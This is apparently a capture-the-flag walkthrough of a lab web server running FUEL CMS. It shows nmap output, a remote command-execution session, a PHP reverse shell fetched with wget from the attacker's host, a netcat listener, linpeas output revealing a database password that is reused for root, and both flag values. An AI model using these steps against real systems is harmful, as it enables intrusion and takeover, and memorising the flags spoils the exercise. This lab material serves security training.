## Objetivo 
A new start-up has a few issues with their web server. 

## Solución 

root@ip-10-10-49-31:~# nmap -sV -sC -A -O -v 10.10.170.216

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-19 21:18 BST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:18
Completed NSE at 21:18, 0.00s elapsed
Initiating NSE at 21:18
Completed NSE at 21:18, 0.00s elapsed
Initiating ARP Ping Scan at 21:18
Scanning 10.10.170.216 [1 port]
Completed ARP Ping Scan at 21:18, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:18
Completed Parallel DNS resolution of 1 host. at 21:18, 0.00s elapsed
Initiating SYN Stealth Scan at 21:18
Scanning ip-10-10-170-216.eu-west-1.compute.internal (10.10.170.216) [1000 ports]
Discovered open port 80/tcp on 10.10.170.216
Completed SYN Stealth Scan at 21:18, 1.27s elapsed (1000 total ports)
Initiating Service scan at 21:18
Scanning 1 service on ip-10-10-170-216.eu-west-1.compute.internal (10.10.170.216)
Completed Service scan at 21:18, 6.96s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against ip-10-10-170-216.eu-west-1.compute.internal (10.10.170.216)
adjust_timeouts2: packet supposedly had rtt of -175093 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175093 microseconds.  Ignoring time.
Retrying OS detection (try #2) against ip-10-10-170-216.eu-west-1.compute.internal (10.10.170.216)
Retrying OS detection (try #3) against ip-10-10-170-216.eu-west-1.compute.internal (10.10.170.216)
Retrying OS detection (try #4) against ip-10-10-170-216.eu-west-1.compute.internal (10.10.170.216)
adjust_timeouts2: packet supposedly had rtt of -175568 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175568 microseconds.  Ignoring time.
Retrying OS detection (try #5) against ip-10-10-170-216.eu-west-1.compute.internal (10.10.170.216)
NSE: Script scanning 10.10.170.216.
Initiating NSE at 21:18
Completed NSE at 21:18, 0.28s elapsed
Initiating NSE at 21:18
Completed NSE at 21:18, 0.00s elapsed
Nmap scan report for ip-10-10-170-216.eu-west-1.compute.internal (10.10.170.216)
Host is up (0.00071s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
MAC Address: 02:63:8D:42:3D:D1 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=10/19%OT=80%CT=1%CU=35870%PV=Y%DS=1%DC=D%G=Y%M=02638D%
OS:TM=67141416%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=107%TI=Z%CI=I%TS=A
OS:)SEQ(SP=FD%GCD=2%ISR=107%TI=Z%CI=I%II=I%TS=A)OPS(O1=M2301ST11NW6%O2=M230
OS:1ST11NW6%O3=M2301NNT11NW6%O4=M2301ST11NW6%O5=M2301ST11NW6%O6=M2301ST11)W
OS:IN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6
OS:903%O=M2301NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)
OS:T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 20.152 days (since Sun Sep 29 17:39:23 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms ip-10-10-170-216.eu-west-1.compute.internal (10.10.170.216)

NSE: Script Post-scanning.
Initiating NSE at 21:18
Completed NSE at 21:18, 0.00s elapsed
Initiating NSE at 21:18
Completed NSE at 21:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.61 seconds
           Raw packets sent: 1168 (59.286KB) | Rcvd: 1126 (52.486KB)

PRIMERA BANDERA:
root@ip-10-10-49-31:~# http://10.10.170.216/ 
/usr/local/lib/python3.11/dist-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (5.2.0)/charset_normalizer (2.0.9) doesn't match a supported version!  
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "  
[+]Connecting...  
Enter Command $whoami  
systemwww-data  
  
  
Enter Command $pwd  
system/var/www/html  
  
Enter Command $ls -all  
systemtotal 52  
drwxrwxrwx 4 root root  4096 Jul 26  2019 .  
drwxr-xr-x 3 root root  4096 Jul 26  2019 ..  
-rw-r--r-- 1 root root   163 Jul 26  2019 .htaccess  
-rwxrwxrwx 1 root root  1427 Jul 26  2019 README.md  
drwxrwxrwx 9 root root  4096 Jul 26  2019 assets  
-rwxrwxrwx 1 root root   193 Jul 26  2019 composer.json  
-rwxrwxrwx 1 root root  6502 Jul 26  2019 contributing.md  
drwxrwxrwx 9 root root  4096 Jul 26  2019 fuel  
-rwxrwxrwx 1 root root 11802 Jul 26  2019 index.php  
-rwxrwxrwx 1 root root    30 Jul 26  2019 robots.txt  
  
Enter Command $ls -all /home  
systemtotal 12  
drwxr-xr-x  3 root     root     4096 Jul 26  2019 .  
drwxr-xr-x 24 root     root     4096 Jul 26  2019 ..  
drwx--x--x  2 www-data www-data 4096 Jul 26  2019 www-data  
  
  
Enter Command $ls -all /home/www-data  
systemtotal 12  
drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .  
drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..  
-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt  
  
  
Enter Command $cat /home/www-data/flag.txt  
system6470e394cbf6dab6a91682cc8585059b

SEGUNDA BANDERA:
root@ip-10-10-49-31:~#cp /usr/share/webshells/php/php-reverse-shell.php .  
  
  
#EDIT IP and PORT   
root@ip-10-10-49-31:~# nano php-reverse-shell.php   
  
root@ip-10-10-49-31:~# python3 -m http.server 8090  
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...  
  
root@ip-10-10-49-31:~# nc -lvp 1234                
listening on [any] 1234 ...

Enter Command $wget http://10.9.102.33:8090/php-reverse-shell.php  
  
Enter Command $ls -all  
systemtotal 156  
drwxrwxrwx 4 root     root      4096 Sep 20 00:46 .  
drwxr-xr-x 3 root     root      4096 Jul 26  2019 ..  
-rw-r--r-- 1 root     root       163 Jul 26  2019 .htaccess  
-rwxrwxrwx 1 root     root      1427 Jul 26  2019 README.md  
drwxrwxrwx 9 root     root      4096 Jul 26  2019 assets  
-rwxrwxrwx 1 root     root       193 Jul 26  2019 composer.json  
-rwxrwxrwx 1 root     root      6502 Jul 26  2019 contributing.md  
drwxrwxrwx 9 root     root      4096 Jul 26  2019 fuel  
-rwxrwxrwx 1 root     root     11802 Jul 26  2019 index.php  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.1  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.10  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.11  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.12  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.2  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.3  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.4  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.5  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.6  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.7  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.8  
-rw-r--r-- 1 www-data www-data  5493 Sep  4 12:03 php-reverse-shell.php.9  
-rwxrwxrwx 1 root     root        30 Jul 26  2019 robots.txt

root@ip-10-10-49-31:~# nc -lvp 1234                
listening on [any] 1234 ...  
10.10.170.216: inverse host lookup failed: Unknown host  
connect to [10.10.155.12] from (UNKNOWN) [10.10.142.14] 40892  


Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist  
 LEGEND:                                                                                                                                                            
  RED/YELLOW: 95% a PE vector  
  RED: You should take a look to it  
  LightCyan: Users with console  
  Blue: Users without console & mounted devs  
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)   
  LightMagenta: Your username  
  
 Starting linpeas. Caching Writable Folders...  
...  
══════════╣ Active Ports  
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                       
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                 
tcp6       0      0 :::80                   :::*                    LISTEN      -                 
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                 
  
...  
╔══════════╣ Analyzing Backup Manager Files (limit 70)  
                                                                                                                                                                    
-rwxrwxrwx 1 root root 4646 Jul 26  2019 /var/www/html/fuel/application/config/database.php  
|       ['password'] The password used to connect to the database  
|       ['database'] The name of the database you want to connect to  
        'password' => 'mememe',  
        'database' => 'fuel_schema',  
...


www-data@ubuntu:/tmp$ su root            
su root   
Password: mememe  
  
root@ubuntu:/tmp# ls -all /root  
ls -all /root  
total 32  
drwx------  4 root root 4096 Jul 26  2019 .  
drwxr-xr-x 24 root root 4096 Jul 26  2019 ..  
-rw-------  1 root root  357 Jul 26  2019 .bash_history  
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc  
drwx------  2 root root 4096 Feb 26  2019 .cache  
drwxr-xr-x  2 root root 4096 Jul 26  2019 .nano  
-rw-r--r--  1 root root  148 Aug 17  2015 .profile  
-rw-r--r--  1 root root   34 Jul 26  2019 root.txt  
root@ubuntu:/tmp# cat /root/root.txt  
cat /root/root.txt  
b9bbcb33e11b80be759c4e844862482d
## Notas
